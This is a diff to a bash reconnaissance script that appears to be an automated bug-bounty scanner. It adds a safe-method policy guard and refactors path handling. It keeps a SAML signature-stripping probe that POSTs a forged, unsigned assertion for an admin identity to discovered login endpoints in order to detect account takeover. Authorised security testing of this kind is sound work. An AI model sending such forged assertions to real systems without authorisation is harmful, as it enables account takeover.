@@ -56,11 +56,21 @@ if [ -z "$RECON_DIR" ] || [ ! -d "$RECON_DIR" ]; then
     exit 1
 fi
 
+RECON_DIR="$(cd "$RECON_DIR" && pwd)"
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-BASE_DIR="$SCRIPT_DIR"
-SESSION_ID=$(basename "$RECON_DIR")
-TARGET=$(basename "$(dirname "$(dirname "$RECON_DIR")")")
-FINDINGS_DIR="${FINDINGS_OUT_DIR:-$BASE_DIR/findings/$TARGET/sessions/$SESSION_ID}"
+BASE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
+
+if [ "$(basename "$(dirname "$RECON_DIR")")" = "sessions" ]; then
+    SESSION_ID=$(basename "$RECON_DIR")
+    TARGET=$(basename "$(dirname "$(dirname "$RECON_DIR")")")
+    DEFAULT_FINDINGS_DIR="$BASE_DIR/findings/$TARGET/sessions/$SESSION_ID"
+else
+    SESSION_ID=""
+    TARGET=$(basename "$RECON_DIR")
+    DEFAULT_FINDINGS_DIR="$BASE_DIR/findings/$TARGET"
+fi
+
+FINDINGS_DIR="${FINDINGS_OUT_DIR:-$DEFAULT_FINDINGS_DIR}"
 
 export PATH="$HOME/go/bin:/usr/local/bin:/opt/homebrew/bin:$PATH"
 export PRIORITY_DIR="$RECON_DIR/priority"
@@ -81,6 +91,40 @@ _has_skip() {
 }
 
 skip_has() { _has_skip "${SKIP_CHECKS:-}" "$1" || { [ "$FULL_MODE" != "--full" ] && _has_skip "xss,lfi,ssti,ssrf,cors,takeover,misconfig,jwt,graphql,smuggling,redirects,idor,auth_bypass,host_header,exposure,cloud,race" "$1"; }; }
+
+unsafe_method_guard() {
+    local method="$1"
+    local url="$2"
+    local label="$3"
+    local guard_output decision reason
+
+    guard_output=$(PYTHONPATH="$BASE_DIR${PYTHONPATH:+:$PYTHONPATH}" python3 - "$method" "$url" <<'PY'
+import sys
+from memory.audit_log import SafeMethodPolicy
+
+result = SafeMethodPolicy().check(sys.argv[1], sys.argv[2])
+print(result["decision"])
+print(result.get("reason", ""))
+PY
+) || {
+        log_warn "Unable to evaluate safe-method policy for $label; skipping"
+        return 1
+    }
+
+    decision=$(printf '%s\n' "$guard_output" | sed -n '1p')
+    reason=$(printf '%s\n' "$guard_output" | sed -n '2p')
+
+    if [ "$decision" = "require_approval" ] && [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
+        log_warn "Skipping $label: $reason. Set ALLOW_UNSAFE_HTTP_TESTS=1 to opt in."
+        return 1
+    fi
+
+    if [ "$decision" = "require_approval" ]; then
+        log_warn "$label uses unsafe HTTP method $method. Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
+    fi
+
+    return 0
+}
 
 # ── Maturity Module: Advanced Verification Logic ─────────────────────────────
 
@@ -361,7 +405,7 @@ if ! skip_has saml; then
     SAML_ENDPOINTS=$(grep -iE "/(saml|sso|login|auth|oauth|acs|idp|sp.init|adfs|okta|ping.fed)" \
         "$ORDERED_SCAN" 2>/dev/null | head -20 || true)
     # Also check common SAML paths on live hosts
-    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)
+    LIVE_HOSTS=$(head -20 "$RECON_DIR/live/urls.txt" 2>/dev/null || true)
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
@@ -394,14 +438,16 @@ if ! skip_has saml; then
     # Signature stripping test via /saml/acs — send stripped assertion
     ACS_URL=$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | grep "saml/acs\|saml/login" | head -1 | awk '{print $2}' || true)
     if [ -n "$ACS_URL" ]; then
-        # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
-        STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
-        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
-            -X POST "$ACS_URL" \
-            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
-        if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
-            log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
-            echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
+        if unsafe_method_guard "POST" "$ACS_URL" "SAML signature-stripping probe"; then
+            # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
+            STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
+            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
+                -X POST "$ACS_URL" \
+                -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
+            if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
+                log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
+                echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
+            fi
         fi
     fi
 
